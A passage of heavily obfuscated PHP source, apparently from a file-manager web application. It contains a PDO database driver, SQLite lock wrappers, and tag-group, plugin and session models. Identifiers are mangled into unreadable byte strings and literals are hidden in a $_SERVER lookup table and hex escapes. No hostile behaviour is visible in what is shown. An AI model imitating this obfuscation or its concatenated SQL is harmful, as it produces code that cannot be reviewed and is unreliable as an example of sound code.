($this->dbType == $ïÛÖÓŠÏ[918]) { if (preg_match($ïÛÖÓŠÏ[926], $this->queryStr, $æˆ„‡ó”)) { $this->table = think_config($ïÛÖÓŠÏ[927]) . str_ireplace(think_config($ïÛÖÓŠÏ[928]), $ïÛÖÓŠÏ[376], $æˆ„‡ó”[2]); $ñ˜²¾ƒÜ = (bool) $this->query($ïÛÖÓŠÏ[929] . strtoupper($this->table) . $ïÛÖÓŠÏ[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ïÛÖÓŠÏ[21], 1); think_status($ïÛÖÓŠÏ[20]); $this->PDOStatement = $this->_linkID->prepare($ÕèÌ¹âÙ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ï’ÌïÆä = $this->PDOStatement->execute($Ø¼üèóá); $this->debug(); if (!1 === $ï’ÌïÆä) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ñ˜²¾ƒÜ || preg_match($ïÛÖÓŠÏ[930], $ÕèÌ¹âÙ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ˆØŸÌº = $this->_linkID->commit(); $this->transTimes = 0; if (!$ˆØŸÌº) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $°ÃÂ›®ü = $this->_linkID->rollback(); $this->transTimes = 0; if (!$°ÃÂ›®ü) { $this->error(); return !1; } } return !0; } private function getAll() { $ò£Ôã¸Ö = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ò£Ôã¸Ö); return $ò£Ôã¸Ö; } public function getFields($…ùâÆšĞ) { $ç­¤Í­ñ =& $_SERVER[Ù×¯Ø…]; $this->initConnect(!0); if (think_config($ç­¤Í­ñ[931])) { $›Ù—ë = str_replace($ç­¤Í­ñ[932], $…ùâÆšĞ, think_config($ç­¤Í­ñ[931])); } else { switch ($this->dbType) { case $ç­¤Í­ñ[915]: case $ç­¤Í­ñ[933]: $›Ù—ë = "\x53\x45\x4c\x45\x43\124\40\40\40\x63\x6f\154\x75\x6d\156\x5f\x6e\x61\155\145\x20\141\x73\x20\x27\x4e\141\x6d\x65\47\54\40\40\40\x64\x61\x74\x61\137\164\171\160\x65\x20\x61\x73\40\47\124\171\160\145\x27\54\x20\x20\x20\x63\x6f\154\165\x6d\156\x5f\x64\145\x66\141\165\154\164\x20\141\163\x20\47\104\x65\x66\141\x75\154\164\x27\x2c\40\x20\x20\151\163\x5f\156\x75\154\x6c\141\142\x6c\145\40\x61\x73\x20\47\x4e\x75\154\154\47\xa\11\x9\x46\x52\x4f\115\11\151\x6e\146\x6f\x72\155\141\164\151\x6f\156\137\163\143\x68\x65\x6d\141\x2e\x74\141\x62\154\145\x73\x20\x41\123\40\x74\12\11\x9\x4a\x4f\x49\x4e\x9\x69\x6e\146\x6f\x72\155\141\164\x69\x6f\x6e\x5f\163\143\x68\145\155\x61\x2e\143\x6f\154\x75\x6d\x6e\x73\x20\x41\123\40\x63\12\11\11\x4f\x4e\40\40\x74\x2e\164\141\x62\x6c\x65\x5f\143\x61\x74\141\x6c\157\147\40\x3d\40\x63\56\164\141\x62\x6c\145\x5f\143\x61\x74\x61\154\157\147\12\11\11\x41\116\x44\x20\x74\x2e\164\x61\x62\154\x65\x5f\x73\x63\150\145\x6d\x61\40\x3d\40\x63\x2e\164\x61\x62\x6c\145\x5f\163\143\x68\145\155\141\12\x9\11\x41\x4e\104\x20\164\x2e\164\141\x62\x6c\145\137\156\141\155\x65\40\75\x20\x63\56\x74\x61\x62\154\145\137\156\x61\155\145\xa\x9\x9\x57\x48\x45\122\105\40\40\x20\x74\56\164\141\142\x6c\x65\137\x6e\141\155\x65\40\75\40\x27{$…ùâÆšĞ}\47"; break; case $ç­¤Í­ñ[934]: $›Ù—ë = $ç­¤Í­ñ[935] . $…ùâÆšĞ . $ç­¤Í­ñ[936]; break; case $ç­¤Í­ñ[916]: case $ç­¤Í­ñ[918]: $›Ù—ë = $ç­¤Í­ñ[937] . $ç­¤Í­ñ[938] . $ç­¤Í­ñ[939] . strtoupper($…ùâÆšĞ) . $ç­¤Í­ñ[940] . strtoupper($…ùâÆšĞ) . $ç­¤Í­ñ[941]; break; case $ç­¤Í­ñ[942]: $›Ù—ë = $ç­¤Í­ñ[943] . $…ùâÆšĞ . $ç­¤Í­ñ[944]; break; case $ç­¤Í­ñ[917]: break; case $ç­¤Í­ñ[945]: default: $›Ù—ë = $ç­¤Í­ñ[946] . ($this->dbType == $ç­¤Í­ñ[945] ? "\140{$…ùâÆšĞ}\x60" : $…ùâÆšĞ); } } $õ¸˜Ëµß = $this->query($›Ù—ë); $¸â”Û‘¯ = array(); if ($õ¸˜Ëµß) { foreach ($õ¸˜Ëµß as $öğÕ¯ï¾ => $¬à óôğ) { $¬à óôğ = array_change_key_case($¬à óôğ); $¬à óôğ[$ç­¤Í­ñ[28]] = isset($¬à óôğ[$ç­¤Í­ñ[28]]) ? $¬à óôğ[$ç­¤Í­ñ[28]] : $ç­¤Í­ñ[376]; $¬à óôğ[$ç­¤Í­ñ[29]] = isset($¬à óôğ[$ç­¤Í­ñ[29]]) ? $¬à óôğ[$ç­¤Í­ñ[29]] : $ç­¤Í­ñ[376]; $¬©Ï÷“é = isset($¬à óôğ[$ç­¤Í­ñ[271]]) ? $¬à óôğ[$ç­¤Í­ñ[271]] : $¬à óôğ[$ç­¤Í­ñ[28]]; $¸â”Û‘¯[$¬©Ï÷“é] = array($ç­¤Í­ñ[28] => $¬©Ï÷“é, $ç­¤Í­ñ[29] => $¬à óôğ[$ç­¤Í­ñ[29]], $ç­¤Í­ñ[31] => (bool) (isset($¬à óôğ[$ç­¤Í­ñ[103]]) && $¬à óôğ[$ç­¤Í­ñ[103]] === $ç­¤Í­ñ[33] || isset($¬à óôğ[$ç­¤Í­ñ[31]]) && $¬à óôğ[$ç­¤Í­ñ[31]] === $ç­¤Í­ñ[33]), $ç­¤Í­ñ[34] => isset($¬à óôğ[$ç­¤Í­ñ[34]]) ? $¬à óôğ[$ç­¤Í­ñ[34]] : (isset($¬à óôğ[$ç­¤Í­ñ[53]]) ? $¬à óôğ[$ç­¤Í­ñ[53]] : $ç­¤Í­ñ[376]), $ç­¤Í­ñ[36] => isset($¬à óôğ[$ç­¤Í­ñ[93]]) ? strtolower($¬à óôğ[$ç­¤Í­ñ[93]]) == $ç­¤Í­ñ[38] : (isset($¬à óôğ[$ç­¤Í­ñ[54]]) ? $¬à óôğ[$ç­¤Í­ñ[54]] : !1), $ç­¤Í­ñ[39] => isset($¬à óôğ[$ç­¤Í­ñ[947]]) ? strtolower($¬à óôğ[$ç­¤Í­ñ[947]]) == $ç­¤Í­ñ[41] : (isset($¬à óôğ[$ç­¤Í­ñ[93]]) ? $¬à óôğ[$ç­¤Í­ñ[93]] : !1)); } } return $¸â”Û‘¯; } public function getTables($‚Åó»ÊÎ = '') { $¡ûÙË’¾ =& $_SERVER[Ù×¯Ø…]; if (think_config($¡ûÙË’¾[948])) { $åÖÔÍ‘» = str_replace($¡ûÙË’¾[949], $‚Åó»ÊÎ, think_config($¡ûÙË’¾[948])); } else { switch ($this->dbType) { case $¡ûÙË’¾[916]: case $¡ûÙË’¾[918]: $åÖÔÍ‘» = $¡ûÙË’¾[950]; break; case $¡ûÙË’¾[915]: case $¡ûÙË’¾[933]: $åÖÔÍ‘» = $¡ûÙË’¾[951]; break; case $¡ûÙË’¾[942]: $åÖÔÍ‘» = $¡ûÙË’¾[952]; break; case $¡ûÙË’¾[917]: think_exception(think_lang($¡ûÙË’¾[953]) . $¡ûÙË’¾[954]); break; case $¡ûÙË’¾[934]: $åÖÔÍ‘» = $¡ûÙË’¾[42] . $¡ûÙË’¾[43] . $¡ûÙË’¾[44]; break; case $¡ûÙË’¾[945]: default: if (!empty($‚Åó»ÊÎ)) { $åÖÔÍ‘» = $¡ûÙË’¾[898] . $‚Åó»ÊÎ . $¡ûÙË’¾[899]; } else { $åÖÔÍ‘» = $¡ûÙË’¾[900]; } } } $™ş¨Ãúœ = $this->query($åÖÔÍ‘»); $úÆÜ³ñÃ = array(); foreach ($™ş¨Ãúœ as $êê²‹Ö => $Ï¤‰Ô‘Î) { $úÆÜ³ñÃ[$êê²‹Ö] = current($Ï¤‰Ô‘Î); } return $úÆÜ³ñÃ; } protected function parseLimit($¥Êóœùğ) { $ò¨É¿¯ =& $_SERVER[Ù×¯Ø…]; $´Ï¡Êé = $ò¨É¿¯[33]; if (!empty($¥Êóœùğ)) { switch ($this->dbType) { case $ò¨É¿¯[942]: case $ò¨É¿¯[934]: $¥Êóœùğ = explode($ò¨É¿¯[47], $¥Êóœùğ); if (count($¥Êóœùğ) > 1) { $´Ï¡Êé .= $ò¨É¿¯[48] . $¥Êóœùğ[1] . $ò¨É¿¯[49] . $¥Êóœùğ[0] . $ò¨É¿¯[50]; } else { $´Ï¡Êé .= $ò¨É¿¯[48] . $¥Êóœùğ[0] . $ò¨É¿¯[50]; } break; case $ò¨É¿¯[915]: case $ò¨É¿¯[933]: break; case $ò¨É¿¯[917]: break; case $ò¨É¿¯[916]: case $ò¨É¿¯[918]: break; case $ò¨É¿¯[945]: default: $´Ï¡Êé .= $ò¨É¿¯[48] . $¥Êóœùğ . $ò¨É¿¯[50]; } } return $´Ï¡Êé; } public function parseKey(&$Úòæ·û, $âåÔ”œ¦ = true) { $ÓÇÈ Î =& $_SERVER[Ù×¯Ø…]; if ($âåÔ”œ¦) { $Úòæ·û = $this->parseKeyCheck($Úòæ·û); } if ($this->dbType == $ÓÇÈ Î[945]) { if ($Úòæ·û != $ÓÇÈ Î[182] && !preg_match($ÓÇÈ Î[910], $Úòæ·û)) { $Úòæ·û = $ÓÇÈ Î[383] . trim($Úòæ·û, $ÓÇÈ Î[383]) . $ÓÇÈ Î[383]; } return $Úòæ·û; } else { return parent::parseKey($Úòæ·û, $âåÔ”œ¦); } } public function close() { $this->_linkID = null; } public function error() { $¹¦¢¤îŸ =& $_SERVER[Ù×¯Ø…]; if ($this->PDOStatement) { $ö‘“àòÔ = $this->PDOStatement->errorInfo(); $this->error = $ö‘“àòÔ[1] . $¹¦¢¤îŸ[4] . $ö‘“àòÔ[2]; } else { $this->error = $¹¦¢¤îŸ[33]; } if ($¹¦¢¤îŸ[33] != $this->queryStr) { $this->error .= LNG($¹¦¢¤îŸ[45]) . $this->queryStr; } think_trace($this->error, $¹¦¢¤îŸ[33], $¹¦¢¤îŸ[46]); return $this->error; } public function escapeString($óŸ¹åÊ‰) { $·’õÄßØ =& $_SERVER[Ù×¯Ø…]; switch ($this->dbType) { case $·’õÄßØ[942]: case $·’õÄßØ[915]: case $·’õÄßØ[933]: case $·’õÄßØ[945]: return addslashes($óŸ¹åÊ‰); case $·’õÄßØ[917]: case $·’õÄßØ[934]: case $·’õÄßØ[916]: case $·’õÄßØ[918]: return str_ireplace($·’õÄßØ[55], $·’õÄßØ[56], $óŸ¹åÊ‰); } } protected function parseValue($¢ÁÔ¤…×) { $´”¬Â± =& $_SERVER[Ù×¯Ø…]; if (is_string($¢ÁÔ¤…×)) { $à†ğú—¤ = strpos($¢ÁÔ¤…×, $´”¬Â±[4]) === 0 && in_array($¢ÁÔ¤…×, array_keys($this->bind)); $¢ÁÔ¤…× = $à†ğú—¤ ? $this->escapeString($¢ÁÔ¤…×) : $´”¬Â±[955] . $this->escapeString($¢ÁÔ¤…×) . $´”¬Â±[955]; } elseif (isset($¢ÁÔ¤…×[0]) && is_string($¢ÁÔ¤…×[0]) && strtolower($¢ÁÔ¤…×[0]) == $´”¬Â±[295]) { $¢ÁÔ¤…× = $this->escapeString($¢ÁÔ¤…×[1]); } elseif (is_array($¢ÁÔ¤…×)) { $¢ÁÔ¤…× = array_map(array($this, $´”¬Â±[956]), $¢ÁÔ¤…×); } elseif (is_bool($¢ÁÔ¤…×)) { $¢ÁÔ¤…× = $¢ÁÔ¤…× ? $´”¬Â±[87] : $´”¬Â±[191]; } elseif (is_null($¢ÁÔ¤…×)) { $¢ÁÔ¤…× = $´”¬Â±[103]; } return $¢ÁÔ¤…×; } public function getLastInsertId() { $Äı¡ÛÖÃ =& $_SERVER[Ù×¯Ø…]; switch ($this->dbType) { case $Äı¡ÛÖÃ[942]: case $Äı¡ÛÖÃ[934]: case $Äı¡ÛÖÃ[915]: case $Äı¡ÛÖÃ[933]: case $Äı¡ÛÖÃ[917]: case $Äı¡ÛÖÃ[945]: return $this->_linkID->lastInsertId(); case $Äı¡ÛÖÃ[916]: case $Äı¡ÛÖÃ[918]: $òßû’å = $this->table; $•ßôô’Á = $this->query("\x53\105\x4c\x45\x43\124\40{$òßû’å}\x2e\x63\165\x72\162\x76\141\x6c\40\143\165\x72\x72\166\141\x6c\40\106\122\x4f\115\x20\x64\x75\x61\x6c"); return $•ßôô’Á ? $•ßôô’Á[0][$Äı¡ÛÖÃ[957]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($çˆ ±ö) { $Ä£ñ²¤ =& $_SERVER[Ù×¯Ø…]; if (!CacheLock::fileLock($Ä£ñ²¤[9])) { return !1; } $·ëÄ½İ¯ = parent::query($çˆ ±ö); CacheLock::fileUnLock($Ä£ñ²¤[9]); return $·ëÄ½İ¯; } public function execute($ Ğğêëñ) { $ä€ØÂéÜ =& $_SERVER[Ù×¯Ø…]; if (!CacheLock::fileLock($ä€ØÂéÜ[9])) { return !1; } $ã¶ µª• = parent::execute($ Ğğêëñ); CacheLock::fileUnLock($ä€ØÂéÜ[9]); return $ã¶ µª•; } } class DbSqlite3 extends DbSqlite3Base { public function query($’Š¢Ò¦¿) { $åÕ¥Êù =& $_SERVER[Ù×¯Ø…]; if (!CacheLock::fileLock($åÕ¥Êù[9])) { return !1; } $—•¿¾Â„ = parent::query($’Š¢Ò¦¿); CacheLock::fileUnLock($åÕ¥Êù[9]); return $—•¿¾Â„; } public function execute($ÚÊÖÚ¬œ) { $ëº°²©µ =& $_SERVER[Ù×¯Ø…]; if (!CacheLock::fileLock($ëº°²©µ[9])) { return !1; } $åÌõÀÇ = parent::execute($ÚÊÖÚ¬œ); CacheLock::fileUnLock($ëº°²©µ[9]); return $åÌõÀÇ; } } goto b”éà¤†œ; a†äµ½¨¹ò: class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\x72\137\x66\141\x76"; protected function cacheFunctionAlias($äÍß») { $—¸‘ÆÀğ =& $_SERVER[Ù×¯Ø…]; return array($—¸‘ÆÀğ[1856] => array($äÍß»[0], $—¸‘ÆÀğ[1857]), $—¸‘ÆÀğ[1858] => array($äÍß»[0], $—¸‘ÆÀğ[1859])); } protected function get($Œò­Š…í) { $€æø³ä‡ =& $_SERVER[Ù×¯Ø…]; $Ç¡š¼›ó = Model($€æø³ä‡[525])->metaGet($Œò­Š…í, $€æø³ä‡[1860]); $Æ·„€Üë = json_decode($Ç¡š¼›ó, !0); return $Æ·„€Üë ? $Æ·„€Üë : array($€æø³ä‡[1861] => $€æø³ä‡[87], $€æø³ä‡[367] => array()); } protected function set($œ™¶óî÷, $‚æŞ¹ôø) { $£ÆÛœíÅ =& $_SERVER[Ù×¯Ø…]; $‚æŞ¹ôø = $‚æŞ¹ôø ? $‚æŞ¹ôø : array($£ÆÛœíÅ[1861] => $£ÆÛœíÅ[87], $£ÆÛœíÅ[367] => array()); Model($£ÆÛœíÅ[525])->metaSet($œ™¶óî÷, $£ÆÛœíÅ[1860], json_encode($‚æŞ¹ôø)); return Model($£ÆÛœíÅ[525])->metaSet($œ™¶óî÷, $£ÆÛœíÅ[1860], json_encode($‚æŞ¹ôø)); } protected function getByTagID($×é³éÒˆ, $ÉóË·Í–) { $ß¤°Íæ¡ =& $_SERVER[Ù×¯Ø…]; if (!$×é³éÒˆ || !$ÉóË·Í–) { return !1; } if (!Model($ß¤°Íæ¡[525])->getInfoSimple($×é³éÒˆ)) { return !1; } $ÌòÙõ—¬ = $this->get($×é³éÒˆ); if (!$ÌòÙõ—¬ || !isset($ÌòÙõ—¬[$ß¤°Íæ¡[367]])) { return !1; } $ª÷¡®ØÒ = array_find_by_field($ÌòÙõ—¬[$ß¤°Íæ¡[367]], $ß¤°Íæ¡[395], $ÉóË·Í–); return is_array($ª÷¡®ØÒ) ? $ª÷¡®ØÒ : !1; } public function listSource($Èà“Ù£Ÿ, $ìì÷áˆô) { $‰—ñ¶ŞÂ =& $_SERVER[Ù×¯Ø…]; if ($ìì÷áˆô && !is_array($ìì÷áˆô)) { $ìì÷áˆô = array($ìì÷áˆô); } $Ç”ª¾° = $this->listData($Èà“Ù£Ÿ); $šòÈ·§ã = array(); foreach ($Ç”ª¾° as $šŸ•şò) { $¬€Ó¸ø = $šŸ•şò[$‰—ñ¶ŞÂ[76]]; if (!$¬€Ó¸ø) { continue; } if (!isset($šòÈ·§ã[$¬€Ó¸ø])) { $šòÈ·§ã[$¬€Ó¸ø] = array(); } $šòÈ·§ã[$¬€Ó¸ø][] = $šŸ•şò[$‰—ñ¶ŞÂ[430]]; } $‘ˆÇÑÉ = array(); foreach ($šòÈ·§ã as $‹íÆÂÀ÷ => $„‹¤Öò•) { $Ø¯„´ì = !0; if (!$ìì÷áˆô) { $‘ˆÇÑÉ[] = $‹íÆÂÀ÷; continue; } foreach ($ìì÷áˆô as $º°ªùáÚ) { if (!in_array($º°ªùáÚ, $„‹¤Öò•)) { $Ø¯„´ì = !1; break; } } if ($Ø¯„´ì) { $‘ˆÇÑÉ[] = $‹íÆÂÀ÷; } } if (!$‘ˆÇÑÉ) { return array(); } $Ùàµ‡Ù = array($‰—ñ¶ŞÂ[421] => array($‰—ñ¶ŞÂ[422], $‘ˆÇÑÉ), $‰—ñ¶ŞÂ[507] => $Èà“Ù£Ÿ, $‰—ñ¶ŞÂ[415] => SourceModel::TYPE_GROUP); $Ç¸–õ¾ = Model($‰—ñ¶ŞÂ[1253])->listSource($Ùàµ‡Ù); if (!$Ç¸–õ¾ || count($‘ˆÇÑÉ) == $Ç¸–õ¾[$‰—ñ¶ŞÂ[364]][$‰—ñ¶ŞÂ[365]]) { return $Ç¸–õ¾; } $ÅµÀº­“ = array(); $÷ıö±ş€ = array_to_keyvalue($Ç¸–õ¾[$‰—ñ¶ŞÂ[75]], $‰—ñ¶ŞÂ[33], $‰—ñ¶ŞÂ[406]); $Ìãóü¾² = array_to_keyvalue($Ç¸–õ¾[$‰—ñ¶ŞÂ[74]], $‰—ñ¶ŞÂ[33], $‰—ñ¶ŞÂ[406]); $Ü©àĞĞ = array_merge($Ìãóü¾², $÷ıö±ş€); foreach ($‘ˆÇÑÉ as $¬€Ó¸ø) { if (!in_array($¬€Ó¸ø, $Ü©àĞĞ)) { $ÅµÀº­“[] = $¬€Ó¸ø; } } if ($ÅµÀº­“) { $this->removeBySource($Èà“Ù£Ÿ, $ÅµÀº­“); } return $Ç¸–õ¾; } protected function listData($¹¨»¶´) { $âÜù¤ =& $_SERVER[Ù×¯Ø…]; $š©”¥Ø = array($âÜù¤[1571] => 0, $âÜù¤[486] => array($âÜù¤[1862], 0), $âÜù¤[426] => $âÜù¤[1863] . $¹¨»¶´); $êÚğÂœÂ = $âÜù¤[1864]; $ÑŞœŸ£ = $this->field($êÚğÂœÂ)->where($š©”¥Ø)->order($âÜù¤[1865])->select(); return $ÑŞœŸ£ ? $ÑŞœŸ£ : array(); } protected function addToTag($Š³ßØå, $ãçİ§¡, $‡ø¶ı‹») { $Ÿôà÷öª =& $_SERVER[Ù×¯Ø…]; if (!$this->getByTagID($Š³ßØå, $‡ø¶ı‹») || !$ãçİ§¡) { return !1; } if (!Model($Ÿôà÷öª[831])->pathInfo($ãçİ§¡)) { return !1; } $ÄõÎ¯ã« = array($Ÿôà÷öª[1571] => 0, $Ÿôà÷öª[486] => $‡ø¶ı‹», $Ÿôà÷öª[425] => $ãçİ§¡, $Ÿôà÷öª[426] => $Ÿôà÷öª[1866] . $Š³ßØå, $Ÿôà÷öª[424] => $Ÿôà÷öª[33], $Ÿôà÷öª[1752] => 0); if ($this->where($ÄõÎ¯ã«)->find()) { return !1; } return $this->add($ÄõÎ¯ã«); } protected function removeFromTag($ÂúŠÁ¡€, $÷Š¾”ÍÑ, $±›Â¾µ) { $Şè¯Ç‚í =& $_SERVER[Ù×¯Ø…]; if (!$this->getByTagID($ÂúŠÁ¡€, $±›Â¾µ) || !$÷Š¾”ÍÑ) { return !1; } if (is_array($÷Š¾”ÍÑ)) { $÷Š¾”ÍÑ = array($Şè¯Ç‚í[7], $÷Š¾”ÍÑ); } $’á‰áô  = array($Şè¯Ç‚í[1571] => 0, $Şè¯Ç‚í[486] => $±›Â¾µ, $Şè¯Ç‚í[426] => $Şè¯Ç‚í[1866] . $ÂúŠÁ¡€, $Şè¯Ç‚í[425] => $÷Š¾”ÍÑ); return $this->where($’á‰áô )->delete(); } protected function removeByTag($–ıÁÚõ§, $ÔŸ”Â›ê) { $ò™ºğÌƒ =& $_SERVER[Ù×¯Ø…]; if (!$this->getByTagID($–ıÁÚõ§, $ÔŸ”Â›ê)) { return !1; } $¹ÕøäÏ• = array($ò™ºğÌƒ[1571] => 0, $ò™ºğÌƒ[486] => $ÔŸ”Â›ê, $ò™ºğÌƒ[426] => $ò™ºğÌƒ[1866] . $–ıÁÚõ§); return $this->where($¹ÕøäÏ•)->delete(); } protected function removeBySource($Ÿ¡½Èõ›, $ºü¸îæ²) { $…®¨öş€ =& $_SERVER[Ù×¯Ø…]; if (!$Ÿ¡½Èõ› || !$ºü¸îæ²) { return !1; } if (is_array($ºü¸îæ²)) { $ºü¸îæ² = array($…®¨öş€[7], $ºü¸îæ²); } $œÖÁÚĞà = array($…®¨öş€[1571] => 0, $…®¨öş€[425] => $ºü¸îæ², $…®¨öş€[486] => array($…®¨öş€[1010], 0), $…®¨öş€[426] => $…®¨öş€[1866] . $Ÿ¡½Èõ›); return $this->where($œÖÁÚĞà)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\x2e\160\154\x75\147\x69\x6e\114\151\x73\x74"; public $field = array("\156\141\x6d\145", "\x73\164\141\x74\x75\x73", "\162\145\x67\151\145\163\164", "\143\157\x6e\x66\151\147"); public function loadList($‡Œ†ä = false) { $Ñšı¦€ë = array_to_keyvalue($this->listData(), $_SERVER[Ù×¯Ø…][28]); if ($‡Œ†ä) { return $Ñšı¦€ë[$‡Œ†ä]; } return $Ñšı¦€ë; } public function init() { $®ßµÙ”— =& $_SERVER[Ù×¯Ø…]; Hook::trigger($®ßµÙ”—[1867]); $€Î©÷¼Ü = $this->loadPluginList(); foreach ($€Î©÷¼Ü as $ÂªÊÂÁ¢ => $ÕèÆÓ¹®) { $ ³°Öı = $this->appAllow($ÂªÊÂÁ¢, $ÕèÆÓ¹®); if (!$ ³°Öı) { continue; } foreach ($ÕèÆÓ¹®[$®ßµÙ”—[1868]] as $Õº„½£° => $úã–®¢Ó) { Hook::bind($Õº„½£°, $úã–®¢Ó); } } Hook::trigger($®ßµÙ”—[1869]); Hook::trigger(ACTION); } public function appAllow($Œ…Š·§Ë, $üãÑî¾Á, $»Çê¤Î† = true) { $˜ëËØ€ =& $_SERVER[Ù×¯Ø…]; $ã‚©¸·İ = PLUGIN_DIR . $Œ…Š·§Ë . $˜ëËØ€[1870]; if (!is_array($üãÑî¾Á) || !is_array($üãÑî¾Á[$˜ëËØ€[1868]]) || $üãÑî¾Á[$˜ëËØ€[749]] != 1 || !is_file($ã‚©¸·İ)) { return !1; } if ($GLOBALS[$˜ëËØ€[508]] == 1) { return !0; } if ($»Çê¤Î† && !Action($˜ëËØ€[1871])->checkAuth($Œ…Š·§Ë)) { return !1; } return !0; } public function unInstall($Ô³ı›ş—) { $ãûüè±ª =& $_SERVER[Ù×¯Ø…]; $ñ°Ùñï = $this->loadList($Ô³ı›ş—); if (file_exists(PLUGIN_DIR . $Ô³ı›ş—)) { Hook::apply($Ô³ı›ş— . $ãûüè±ª[1872]); } $this->remove($ñ°Ùñï[$ãûüè±ª[395]]); } public function changeStatus($îÊ“ÑÆò, $ºŞúŒÆ) { $öÖÉâùÀ =& $_SERVER[Ù×¯Ø…]; $×‡¿¦Ó÷ = $this->loadList($îÊ“ÑÆò); if ($ºŞúŒÆ) { Hook::apply($îÊ“ÑÆò . $öÖÉâùÀ[1873]); } $this->update($×‡¿¦Ó÷[$öÖÉâùÀ[395]], array($öÖÉâùÀ[1874] => $ºŞúŒÆ)); } public function appRegist($Ğ·Ñ ü», $Ÿ¯–×ÏŒ) { $‘şèåò¯ =& $_SERVER[Ù×¯Ø…]; $Ëé˜ñ° = $this->loadList($Ğ·Ñ ü»); if ($Ëé˜ñ°) { $this->update($Ëé˜ñ°[$‘şèåò¯[395]], array($‘şèåò¯[1868] => $Ÿ¯–×ÏŒ)); } else { $Èí¾í´ä = array($‘şèåò¯[28] => $Ğ·Ñ ü», $‘şèåò¯[1868] => $Ÿ¯–×ÏŒ, $‘şèåò¯[749] => 0, $‘şèåò¯[6] => $this->getConfigDefault($Ğ·Ñ ü»)); $this->insert($Èí¾í´ä); } } public function getConfigDefault($î¢ì­ì) { $šÓ¾¶æ» =& $_SERVER[Ù×¯Ø…]; $Ë–şïÒø = array(); $§Ôüí¶ = $this->getPackageJson($î¢ì­ì); if (!$§Ôüí¶ && is_array($§Ôüí¶[$šÓ¾¶æ»[1875]])) { return $Ë–şïÒø; } foreach ($§Ôüí¶[$šÓ¾¶æ»[1875]] as $…ÖïÖì» => $ßäİ³…») { if (!isset($ßäİ³…»[$šÓ¾¶æ»[372]]) || isset($Ë–şïÒø[$…ÖïÖì»])) { continue; } $Ë–şïÒø[$…ÖïÖì»] = $ßäİ³…»[$šÓ¾¶æ»[372]]; } return $Ë–şïÒø; } public function getPackageJson($§‚§Ò) { return Hook::apply($§‚§Ò . $_SERVER[Ù×¯Ø…][1876]); } public function getConfig($ù—Å¯ãÓ, $Öºã·¤‡ = false) { $Åïù÷×™ =& $_SERVER[Ù×¯Ø…]; $şä•¿ö” = array(); $ôñõô¯Ñ = $this->loadList($ù—Å¯ãÓ); if ($ôñõô¯Ñ && is_array($ôñõô¯Ñ[$Åïù÷×™[6]])) { $şä•¿ö” = $ôñõô¯Ñ[$Åïù÷×™[6]]; } if (!$şä•¿ö” || $Öºã·¤‡) { $şä•¿ö” = $this->getConfigDefault($ù—Å¯ãÓ); } return $şä•¿ö”; } public function setConfig($ÙÕ‚Úú, $Š¶ò»ğï = false) { $×‹¯æ…§ =& $_SERVER[Ù×¯Ø…]; $¢±Åµ÷Ñ = $this->loadList($ÙÕ‚Úú); if (!$¢±Åµ÷Ñ) { return !1; } $Ñ€®„ = $¢±Åµ÷Ñ[$×‹¯æ…§[6]]; if ($Š¶ò»ğï == !1) { $Ñ€®„ = array(); $Š¶ò»ğï = $this->getConfigDefault($ÙÕ‚Úú); } foreach ($Š¶ò»ğï as $¼…©çş¶ => $ûßã¾·Ã) { $Ñ€®„[$¼…©çş¶] = is_string($ûßã¾·Ã) ? trim($ûßã¾·Ã) : $ûßã¾·Ã; } $this->update($¢±Åµ÷Ñ[$×‹¯æ…§[395]], array($×‹¯æ…§[6] => $Ñ€®„)); } public function viewList() { $Ûòıàİì =& $_SERVER[Ù×¯Ø…]; $í¬×Å¾ = $this->loadList(); $this->pluginScan($í¬×Å¾); $í¬×Å¾ = $this->loadPluginList(); $Ê£¥¶ = array(); foreach ($í¬×Å¾ as $ù’¿Ë£ë => $ä¾‹”ĞŒ) { unset($ä¾‹”ĞŒ[$Ûòıàİì[1868]], $ä¾‹”ĞŒ[$Ûòıàİì[6]]); $Ê„ñÏ–ú = PLUGIN_DIR . $ä¾‹”ĞŒ[$Ûòıàİì[28]] . $Ûòıàİì[1870]; if (!is_file($Ê„ñÏ–ú)) { continue; } $ ×Â§ˆ“ = Hook::apply($ä¾‹”ĞŒ[$Ûòıàİì[28]] . $Ûòıàİì[1876]); if (is_array($ ×Â§ˆ“)) { $Ê£¥¶[$ù’¿Ë£ë] = array_merge($ä¾‹”ĞŒ, $ ×Â§ˆ“); } } return $Ê£¥¶; } private function loadPluginList() { $ç™Š­ =& $_SERVER[Ù×¯Ø…]; $²š¸£¨ = $this->loadList(); if (strtolower(MOD) == $ç™Š­[1877]) { return $²š¸£¨; } $–úæÖ½à = Hook::trigger($ç™Š­[1878], $²š¸£¨); if ($²š¸£¨ && !$–úæÖ½à) { die; } return $–úæÖ½à ? $–úæÖ½à : $²š¸£¨; } private function pluginScan($î–ÊöÎ) { $Ù…Ÿ³Èî =& $_SERVER[Ù×¯Ø…]; recursion_dir(PLUGIN_DIR, $€§ôà, $Ã²™ì…¹, 0); foreach ($€§ôà as $ô€ÙÚŒ) { $àÌã»Ê€ = get_path_this($ô€ÙÚŒ); if (isset($î–ÊöÎ[$àÌã»Ê€]) || !file_exists($ô€ÙÚŒ . $Ù…Ÿ³Èî[1879]) || !file_exists($ô€ÙÚŒ . $Ù…Ÿ³Èî[1870])) { continue; } Hook::apply($àÌã»Ê€ . $Ù…Ÿ³Èî[1873]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\x74\145\x6d\x5f\163\x65\163\x73\x69\x6f\156"; public function get($ò«€Á¬¢) { $Õ¯¨ì¿÷ =& $_SERVER[Ù×¯Ø…]; $“üæ È‰ = $this->where(array($Õ¯¨ì¿÷[1880] => $ò«€Á¬¢))->find(); if (!is_array($“üæ È‰)) { return !1; } return $“üæ È‰[$Õ¯¨ì¿÷[754]]; } public function set($şÕïˆ×, $€®™ßñ¦, $²àÙ¹•† = 3600) { $Ù”óß 